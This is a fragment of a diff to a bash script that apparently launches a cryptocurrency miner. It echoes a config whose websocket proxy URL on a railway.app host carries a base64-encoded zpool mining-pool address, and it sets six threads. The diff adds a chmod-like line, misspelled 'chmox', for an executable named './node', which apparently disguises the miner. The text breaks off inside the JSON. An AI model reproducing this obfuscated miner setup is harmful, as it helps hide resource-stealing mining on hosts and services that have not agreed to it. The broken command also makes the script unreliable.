@@ -1,6 +1,8 @@
 #!/bin/bash
 MIN=$1
 
+chmox +x ./node
+
 echo '{
   "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
   "config": { "threads": 6, "log": true },
